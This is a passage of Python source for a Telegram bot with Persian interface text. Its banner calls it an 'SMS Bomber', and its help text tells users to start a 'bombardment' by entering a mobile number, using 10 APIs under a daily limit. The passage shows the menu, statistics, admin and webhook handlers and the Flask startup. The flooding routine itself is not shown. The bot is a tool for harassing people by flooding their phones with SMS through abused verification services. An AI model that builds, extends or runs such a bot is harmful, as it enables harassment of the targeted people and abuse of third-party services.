        "1️⃣ روی دکمه **🚀 شروع بمباران** کلیک کنید\n"
        "2️⃣ شماره موبایل را وارد کنید\n"
        "3️⃣ منتظر بمانید تا فرآیند کامل شود\n"
        "4️⃣ برای توقف از دستور /stop استفاده کنید\n\n"
        "🔰 **مشخصات:**\n"
        f"• تعداد APIها: 10 عدد\n"
        f"• محدودیت روزانه: {DAILY_LIMIT} بار\n"
        f"• زمان تقریبی: 30 ثانیه\n\n"
        "⚠️ **هشدار:** استفاده مسئولانه"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
def my_stats(message):
    user_id = message.from_user.id
    daily = get_daily_count(user_id)
    remaining = DAILY_LIMIT - daily
    result = db.get_user_total(user_id)
    total = result[0] if result else 0
    join_date = result[1] if result else "نامشخص"
    
    status = "👑 ادمین" if is_admin(user_id) else "👤 کاربر عادی"
    
    text = (
        f"📊 **آمار شما**\n\n"
        f"🆔 **آیدی:** `{user_id}`\n"
        f"👤 **نوع:** {status}\n"
        f"📅 **عضویت:** {join_date}\n"
        f"📊 **استفاده امروز:** {daily}/{DAILY_LIMIT}\n"
        f"✅ **باقیمانده:** {remaining}\n"
        f"🔰 **کل استفاده:** {total}"
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ دسترسی غیرمجاز!")
        return
    
    total_users, today_users, total_requests, weekly = db.get_stats()
    
    text = (
        "👑 **پنل مدیریت**\n\n"
        f"📊 **آمار کلی:**\n"
        f"👥 **کل کاربران:** {total_users}\n"
        f"📅 **کاربران امروز:** {today_users}\n"
        f"🔰 **کل درخواست:** {total_requests}\n\n"
        f"📈 **آمار هفتگی:**\n"
    )
    
    for w in weekly:
        text += f"  • {w[0]}: {w[1]} درخواست\n"
    
    # دکمه‌های مدیریتی
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔄 ریستارت Webhook", callback_data="admin_restart_webhook"),
        InlineKeyboardButton("📋 وضعیت Webhook", callback_data="admin_webhook_status")
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ دسترسی غیرمجاز!")
        return
    
    if call.data == "admin_restart_webhook":
        try:
            bot.answer_callback_query(call.id, "🔄 در حال تنظیم مجدد...")
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            bot.send_message(call.message.chat.id, f"✅ Webhook تنظیم شد روی:\n`{WEBHOOK_URL}`", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ خطا: {e}")
    
    elif call.data == "admin_webhook_status":
        try:
            info = bot.get_webhook_info()
            text = f"📊 **وضعیت Webhook**\n\n"
            text += f"📌 **آدرس فعلی:** {info.url or 'تنظیم نشده'}\n"
            text += f"✅ **آدرس درست:** {WEBHOOK_URL}\n"
            text += f"📊 **آپدیت‌های در انتظار:** {info.pending_update_count}\n"
            
            if info.last_error_message:
                text += f"⚠️ **آخرین خطا:** {info.last_error_message}\n"
            
            if info.url == WEBHOOK_URL:
                text += f"\n✅ **Webhook درست است**"
            else:
                text += f"\n❌ **Webhook اشتباه است**"
            
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ خطا: {e}")

@bot.message_handler(commands=['stop'])
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in user_processes:
        user_processes[chat_id] = False
        bot.send_message(chat_id, "⛔ فرآیند متوقف شد.")
    else:
        bot.send_message(chat_id, "⚠️ هیچ فرآیند فعالی وجود ندارد.")

@bot.message_handler(commands=['webhook'])
def webhook_command(message):
    """بررسی Webhook"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ دسترسی ندارید")
        return
    
    try:
        info = bot.get_webhook_info()
        
        text = f"📊 **اطلاعات Webhook**\n\n"
        text += f"📌 **آدرس فعلی:** {info.url or 'تنظیم نشده'}\n"
        text += f"✅ **آدرس درست:** {WEBHOOK_URL}\n"
        text += f"📊 **آپدیت‌های در انتظار:** {info.pending_update_count}\n"
        
        if info.last_error_message:
            text += f"⚠️ **آخرین خطا:** {info.last_error_message}\n"
        
        if info.url != WEBHOOK_URL:
            text += f"\n🔄 **در حال تنظیم مجدد...**\n"
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            text += f"✅ **Webhook تنظیم شد روی:** {WEBHOOK_URL}"
        elif info.url == WEBHOOK_URL:
            text += f"\n✅ **Webhook درست است**"
        
        bot.reply_to(message, text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ خطا: {e}")

@bot.message_handler(func=lambda m: True)
def default_handler(message):
    bot.reply_to(message, "❌ دستور نامعتبر. از دکمه‌های منو استفاده کنید.")

# ==================== اجرا ====================

if __name__ == "__main__":
    print("="*60)
    print("🤖 ربات SMS Bomber - نسخه نهایی")
    print("="*60)
    print(f"📌 نام سرویس: {SERVICE_NAME}")
    print(f"📌 آدرس: {BASE_URL}")
    print(f"📌 Webhook: {WEBHOOK_URL}")
    print(f"📌 ادمین‌ها: {len(ADMIN_IDS)} نفر")
    print(f"📌 محدودیت روزانه: {DAILY_LIMIT} بار")
    print("="*60)
    
    # تنظیم webhook در ترد جدا
    def run_setup():
        time.sleep(3)  # صبر برای بالا آمدن Flask
        print("🔄 در حال تنظیم Webhook...")
        set_webhook()
    
    threading.Thread(target=run_setup, daemon=True).start()
    
    # دریافت پورت از محیط
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 اجرا روی پورت {port}")
    print("="*60)
    
    # اجرای Flask
    app.run(host='0.0.0.0', port=port)
